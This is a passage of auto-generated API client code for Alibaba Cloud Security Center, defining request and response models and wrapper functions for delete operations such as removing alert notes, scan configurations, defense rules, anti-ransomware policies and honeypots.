  noteId?: long(name='NoteId', description='The ID of the remarks.

>  You can call the [ListAgentlessMaliciousFiles](~~ListAgentlessMaliciousFiles~~) operation to obtain the ID from the NoteId parameter.', example='1'),
}

model DeleteMaliciousNoteResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53CXXXXX'),
}

model DeleteMaliciousNoteResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteMaliciousNoteResponseBody(name='body'),
}

/**
 * @summary Removes the remarks added to alert events that are generated by the agentless detection feature.
 *
 * @param request DeleteMaliciousNoteRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteMaliciousNoteResponse
 */
async function deleteMaliciousNoteWithOptions(request: DeleteMaliciousNoteRequest, runtime: Util.RuntimeOptions): DeleteMaliciousNoteResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.noteId)) {
    query['NoteId'] = request.noteId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteMaliciousNote',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Removes the remarks added to alert events that are generated by the agentless detection feature.
 *
 * @param request DeleteMaliciousNoteRequest
 * @return DeleteMaliciousNoteResponse
 */
async function deleteMaliciousNote(request: DeleteMaliciousNoteRequest): DeleteMaliciousNoteResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteMaliciousNoteWithOptions(request, runtime);
}

model DeleteMonitorAccountRequest {
  accountId?: string(name='AccountId', description='The ID of the member that you want to delete.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the IDs of the members in the Security Center console.

This parameter is required.', example='1840517068******'),
}

model DeleteMonitorAccountResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DeleteMonitorAccountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteMonitorAccountResponseBody(name='body'),
}

/**
 * @summary Deletes a member of the account managed by Security Center type of the multi-account management feature.
 *
 * @description You must use the management account of your resource directory or a delegated administrator account of Security Center to call this operation.
 *
 * @param request DeleteMonitorAccountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteMonitorAccountResponse
 */
async function deleteMonitorAccountWithOptions(request: DeleteMonitorAccountRequest, runtime: Util.RuntimeOptions): DeleteMonitorAccountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.accountId)) {
    query['AccountId'] = request.accountId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteMonitorAccount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a member of the account managed by Security Center type of the multi-account management feature.
 *
 * @description You must use the management account of your resource directory or a delegated administrator account of Security Center to call this operation.
 *
 * @param request DeleteMonitorAccountRequest
 * @return DeleteMonitorAccountResponse
 */
async function deleteMonitorAccount(request: DeleteMonitorAccountRequest): DeleteMonitorAccountResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteMonitorAccountWithOptions(request, runtime);
}

model DeleteOpaStrategyNewRequest {
  strategyIds?: [ long ](name='StrategyIds', description='The IDs of rules.'),
}

model DeleteOpaStrategyNewResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='success'),
  requestId?: string(name='RequestId', description='The request ID.', example='8FD58F11-0F4D-5C7F-B9B2-CFD76108F9A4'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteOpaStrategyNewResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteOpaStrategyNewResponseBody(name='body'),
}

/**
 * @summary Deletes rules of the at-risk image blocking type.
 *
 * @param request DeleteOpaStrategyNewRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteOpaStrategyNewResponse
 */
async function deleteOpaStrategyNewWithOptions(request: DeleteOpaStrategyNewRequest, runtime: Util.RuntimeOptions): DeleteOpaStrategyNewResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyIds)) {
    query['StrategyIds'] = request.strategyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteOpaStrategyNew',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes rules of the at-risk image blocking type.
 *
 * @param request DeleteOpaStrategyNewRequest
 * @return DeleteOpaStrategyNewResponse
 */
async function deleteOpaStrategyNew(request: DeleteOpaStrategyNewRequest): DeleteOpaStrategyNewResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteOpaStrategyNewWithOptions(request, runtime);
}

model DeleteOssScanConfigRequest {
  id?: long(name='Id', description='The configuration ID.

>  You can call the [ListOssScanConfig](~~ListOssScanConfig~~) operation to query configuration IDs.', example='1589'),
}

model DeleteOssScanConfigResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DeleteOssScanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteOssScanConfigResponseBody(name='body'),
}

/**
 * @summary Deletes the configuration of an Object Storage Service (OSS) file detection policy.
 *
 * @param request DeleteOssScanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteOssScanConfigResponse
 */
async function deleteOssScanConfigWithOptions(request: DeleteOssScanConfigRequest, runtime: Util.RuntimeOptions): DeleteOssScanConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteOssScanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes the configuration of an Object Storage Service (OSS) file detection policy.
 *
 * @param request DeleteOssScanConfigRequest
 * @return DeleteOssScanConfigResponse
 */
async function deleteOssScanConfig(request: DeleteOssScanConfigRequest): DeleteOssScanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteOssScanConfigWithOptions(request, runtime);
}

model DeletePrivateRegistryRequest {
  registryId?: long(name='RegistryId', description='The ID of the image repository.

> You can call the [PageImageRegistry](~~PageImageRegistry~~) operation to query the IDs of image repositories.

This parameter is required.', example='22233'),
}

model DeletePrivateRegistryResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='818E3B38-F018-50FF-9A85-5A521747****'),
}

model DeletePrivateRegistryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeletePrivateRegistryResponseBody(name='body'),
}

/**
 * @summary Deletes a private image repository by using the ID of the image repository.
 *
 * @param request DeletePrivateRegistryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeletePrivateRegistryResponse
 */
async function deletePrivateRegistryWithOptions(request: DeletePrivateRegistryRequest, runtime: Util.RuntimeOptions): DeletePrivateRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryId)) {
    query['RegistryId'] = request.registryId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeletePrivateRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a private image repository by using the ID of the image repository.
 *
 * @param request DeletePrivateRegistryRequest
 * @return DeletePrivateRegistryResponse
 */
async function deletePrivateRegistry(request: DeletePrivateRegistryRequest): DeletePrivateRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return deletePrivateRegistryWithOptions(request, runtime);
}

model DeleteSasContainerWebDefenseRuleRequest {
  ruleId?: long(name='RuleId', description='The rule ID.

>  You can call the ListContainerWebDefenseRule operation to query the rule ID.

This parameter is required.', example='400597'),
}

model DeleteSasContainerWebDefenseRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model DeleteSasContainerWebDefenseRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteSasContainerWebDefenseRuleResponseBody(name='body'),
}

/**
 * @summary Deletes a rule for container tamper-proofing.
 *
 * @param request DeleteSasContainerWebDefenseRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteSasContainerWebDefenseRuleResponse
 */
async function deleteSasContainerWebDefenseRuleWithOptions(request: DeleteSasContainerWebDefenseRuleRequest, runtime: Util.RuntimeOptions): DeleteSasContainerWebDefenseRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSasContainerWebDefenseRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a rule for container tamper-proofing.
 *
 * @param request DeleteSasContainerWebDefenseRuleRequest
 * @return DeleteSasContainerWebDefenseRuleResponse
 */
async function deleteSasContainerWebDefenseRule(request: DeleteSasContainerWebDefenseRuleRequest): DeleteSasContainerWebDefenseRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSasContainerWebDefenseRuleWithOptions(request, runtime);
}

model DeleteSearchConditionRequest {
  name?: string(name='Name', description='The name of the frequently used search condition.

>  You can call the [DescribeSearchCondition](~~DescribeSearchCondition~~) operation to query frequently used search conditions.

This parameter is required.', example='test'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='19.12.XX.XX'),
  type?: string(name='Type', description='The type of the asset. Default value: ecs. Valid values:

*   **ecs**: an Elastic Compute Service (ECS) instance.
*   **cloud_product**: an Alibaba Cloud service.', example='ecs'),
}

model DeleteSearchConditionResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='2983C540-E51F-582A-B510-732C27CD914C'),
}

model DeleteSearchConditionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteSearchConditionResponseBody(name='body'),
}

/**
 * @summary Deletes a frequently used search condition by using the asset management feature of the Assets module in the Security Center console.
 *
 * @param request DeleteSearchConditionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteSearchConditionResponse
 */
async function deleteSearchConditionWithOptions(request: DeleteSearchConditionRequest, runtime: Util.RuntimeOptions): DeleteSearchConditionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSearchCondition',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a frequently used search condition by using the asset management feature of the Assets module in the Security Center console.
 *
 * @param request DeleteSearchConditionRequest
 * @return DeleteSearchConditionResponse
 */
async function deleteSearchCondition(request: DeleteSearchConditionRequest): DeleteSearchConditionResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSearchConditionWithOptions(request, runtime);
}

model DeleteSecurityEventMarkMissListRequest {
  ids?: [ long ](name='Ids', description='The IDs of custom defense rule.'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DeleteSecurityEventMarkMissListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='23AD0BD2-8771-5647-819E-6BA51E2XXXXX'),
}

model DeleteSecurityEventMarkMissListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteSecurityEventMarkMissListResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DeleteSecurityEventMarkMissList is deprecated, please use Sas::2018-12-03::ModifySecurityEventMarkMissIndividually instead.
 *
 * @summary Deletes multiple custom defense rules at a time. The custom defense rules are used to add false positive alerts to the whitelist.
 *
 * @param request DeleteSecurityEventMarkMissListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteSecurityEventMarkMissListResponse
 */
// Deprecated
async function deleteSecurityEventMarkMissListWithOptions(request: DeleteSecurityEventMarkMissListRequest, runtime: Util.RuntimeOptions): DeleteSecurityEventMarkMissListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSecurityEventMarkMissList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DeleteSecurityEventMarkMissList is deprecated, please use Sas::2018-12-03::ModifySecurityEventMarkMissIndividually instead.
 *
 * @summary Deletes multiple custom defense rules at a time. The custom defense rules are used to add false positive alerts to the whitelist.
 *
 * @param request DeleteSecurityEventMarkMissListRequest
 * @return DeleteSecurityEventMarkMissListResponse
 */
// Deprecated
async function deleteSecurityEventMarkMissList(request: DeleteSecurityEventMarkMissListRequest): DeleteSecurityEventMarkMissListResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSecurityEventMarkMissListWithOptions(request, runtime);
}

model DeleteServiceTrailRequest {
  regionId?: string(name='RegionId', description='The region in which your Security Center service is deployed. Valid values:

*   **cn-hangzhou**: center.
*   **ap-southeast-1**: Singapore.', example='cn-hangzhou'),
}

model DeleteServiceTrailResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='20456DD5-5CBF-5015-9173-12CA4246B***'),
}

model DeleteServiceTrailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteServiceTrailResponseBody(name='body'),
}

/**
 * @summary Deletes a service trail.
 *
 * @param request DeleteServiceTrailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteServiceTrailResponse
 */
async function deleteServiceTrailWithOptions(request: DeleteServiceTrailRequest, runtime: Util.RuntimeOptions): DeleteServiceTrailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteServiceTrail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a service trail.
 *
 * @param request DeleteServiceTrailRequest
 * @return DeleteServiceTrailResponse
 */
async function deleteServiceTrail(request: DeleteServiceTrailRequest): DeleteServiceTrailResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteServiceTrailWithOptions(request, runtime);
}

model DeleteSoarStrategyTaskRequest {
  strategyTaskId?: long(name='StrategyTaskId', description='The ID of the policy task that is in the waiting state.

>  You can call the [DescribeSoarStrategyTasks](~~DescribeSoarStrategyTasks~~) operation to obtain the ID.

This parameter is required.', example='11082'),
}

model DeleteSoarStrategyTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
}

model DeleteSoarStrategyTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteSoarStrategyTaskResponseBody(name='body'),
}

/**
 * @summary Deletes a policy task that is in the waiting state on the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DeleteSoarStrategyTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteSoarStrategyTaskResponse
 */
async function deleteSoarStrategyTaskWithOptions(request: DeleteSoarStrategyTaskRequest, runtime: Util.RuntimeOptions): DeleteSoarStrategyTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyTaskId)) {
    query['StrategyTaskId'] = request.strategyTaskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSoarStrategyTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a policy task that is in the waiting state on the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DeleteSoarStrategyTaskRequest
 * @return DeleteSoarStrategyTaskResponse
 */
async function deleteSoarStrategyTask(request: DeleteSoarStrategyTaskRequest): DeleteSoarStrategyTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSoarStrategyTaskWithOptions(request, runtime);
}

model DeleteStrategyRequest {
  id?: string(name='Id', description='The ID of the baseline check policy that you want to delete.

This parameter is required.', example='1404656'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX'),
}

model DeleteStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DeleteStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteStrategyResponseBody(name='body'),
}

/**
 * @summary Deletes a baseline check policy.
 *
 * @param request DeleteStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteStrategyResponse
 */
async function deleteStrategyWithOptions(request: DeleteStrategyRequest, runtime: Util.RuntimeOptions): DeleteStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a baseline check policy.
 *
 * @param request DeleteStrategyRequest
 * @return DeleteStrategyResponse
 */
async function deleteStrategy(request: DeleteStrategyRequest): DeleteStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteStrategyWithOptions(request, runtime);
}

model DeleteSuspEventNodeRequest {
  noteId?: long(name='NoteId', description='The ID of the description.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to obtain the ID of the description by using the EventNotes field.

This parameter is required.', example='123'),
}

model DeleteSuspEventNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The additional information that is returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='A57C711B-AA15-55B2-8F61-4D09CEXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteSuspEventNodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteSuspEventNodeResponseBody(name='body'),
}

/**
 * @summary Deletes the description of an alert.
 *
 * @param request DeleteSuspEventNodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteSuspEventNodeResponse
 */
async function deleteSuspEventNodeWithOptions(request: DeleteSuspEventNodeRequest, runtime: Util.RuntimeOptions): DeleteSuspEventNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.noteId)) {
    query['NoteId'] = request.noteId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSuspEventNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes the description of an alert.
 *
 * @param request DeleteSuspEventNodeRequest
 * @return DeleteSuspEventNodeResponse
 */
async function deleteSuspEventNode(request: DeleteSuspEventNodeRequest): DeleteSuspEventNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSuspEventNodeWithOptions(request, runtime);
}

model DeleteTagWithUuidRequest {
  tagName?: string(name='TagName', description='The name of the tag.

This parameter is required.', example='abc'),
  uuidList?: string(name='UuidList', description='The UUIDs of servers.

> If the UuidList parameter is specified, Security Center removes the tag only from the servers whose UUIDs are specified by UuidList. If the UuidList parameter is not specified, Security Center removes the tag from all servers.', example='111-xx,aa-bb'),
}

model DeleteTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteTagWithUuidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteTagWithUuidResponseBody(name='body'),
}

/**
 * @summary Removes custom tags from assets.
 *
 * @description Security Center provides asset importance tags and custom tags. You can call this operation to remove only the custom tag that is added to an asset.
 *
 * @param request DeleteTagWithUuidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteTagWithUuidResponse
 */
async function deleteTagWithUuidWithOptions(request: DeleteTagWithUuidRequest, runtime: Util.RuntimeOptions): DeleteTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tagName)) {
    query['TagName'] = request.tagName;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Removes custom tags from assets.
 *
 * @description Security Center provides asset importance tags and custom tags. You can call this operation to remove only the custom tag that is added to an asset.
 *
 * @param request DeleteTagWithUuidRequest
 * @return DeleteTagWithUuidResponse
 */
async function deleteTagWithUuid(request: DeleteTagWithUuidRequest): DeleteTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteTagWithUuidWithOptions(request, runtime);
}

model DeleteUniBackupPolicyRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies. You must specify at least one of the PolicyId parameter and the **PolicyIds** parameter.', example='123'),
  policyIds?: string(name='PolicyIds', description='The IDs of anti-ransomware policies.

>  You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies. You must specify at least one of the **PolicyId** parameter and the PolicyIds parameter.', example='123,124'),
}

model DeleteUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4F07F4F1-88ED-5569-B519-FFCC9B7E****'),
}

model DeleteUniBackupPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteUniBackupPolicyResponseBody(name='body'),
}

/**
 * @summary Deletes anti-ransomware policies that are created for databases.
 *
 * @param request DeleteUniBackupPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteUniBackupPolicyResponse
 */
async function deleteUniBackupPolicyWithOptions(request: DeleteUniBackupPolicyRequest, runtime: Util.RuntimeOptions): DeleteUniBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyIds)) {
    query['PolicyIds'] = request.policyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes anti-ransomware policies that are created for databases.
 *
 * @param request DeleteUniBackupPolicyRequest
 * @return DeleteUniBackupPolicyResponse
 */
async function deleteUniBackupPolicy(request: DeleteUniBackupPolicyRequest): DeleteUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteUniBackupPolicyWithOptions(request, runtime);
}

model DeleteVpcHoneyPotRequest {
  vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC) on which the honeypot is deployed.

> You can call the [DescribeVpcHoneyPotList](~~DescribeVpcHoneyPotList~~) operation to query the IDs of VPCs.

This parameter is required.', example='vpc-d7o009q63fqy21r8u****'),
}

model DeleteVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4347E985-6E64-467B-96EC-30D4EA9E32FB'),
}

model DeleteVpcHoneyPotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteVpcHoneyPotResponseBody(name='body'),
}

/**
 * @summary Deletes a honeypot.
 *
 * @param request DeleteVpcHoneyPotRequest
